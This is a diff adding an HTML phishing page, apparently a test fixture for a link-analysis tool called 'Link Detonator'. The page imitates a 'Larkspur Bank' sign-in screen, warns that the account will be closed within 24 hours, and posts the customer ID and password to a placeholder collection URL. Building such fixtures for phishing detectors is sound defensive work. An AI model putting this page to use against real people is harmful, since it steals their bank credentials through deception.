@@ -1,0 +1,32 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Larkspur Bank sign in</title>
+<style>
+  body { margin: 0; font: 16px/1.5 Helvetica, Arial, sans-serif; color: #17302a; background: #e9efe9; }
+  .card { max-width: 380px; margin: 64px auto; padding: 32px; background: #fff; border: 1px solid #c4d0c8; }
+  label { display: block; margin-top: 16px; }
+  input { width: 100%; box-sizing: border-box; padding: 8px; }
+  button { margin-top: 20px; padding: 10px 18px; background: #17302a; color: #fff; border: 0; }
+  .urgent { color: #8a1f11; }
+  footer { text-align: center; padding: 16px; }
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Larkspur Bank</h1>
+  <p class="urgent">Your account is on hold. Sign in within 24 hours to keep it open.</p>
+  <form action="http://fixtures.invalid/phish-login/collect" method="post">
+    <input type="hidden" name="session_ref" value="fixture">
+    <label for="username">Customer ID</label>
+    <input id="username" name="username" autocomplete="off">
+    <label for="password">Password</label>
+    <input id="password" name="password" type="password" autocomplete="off">
+    <button type="submit">Sign in</button>
+  </form>
+</div>
+<footer>Link Detonator test fixture</footer>
+</body>
+</html>
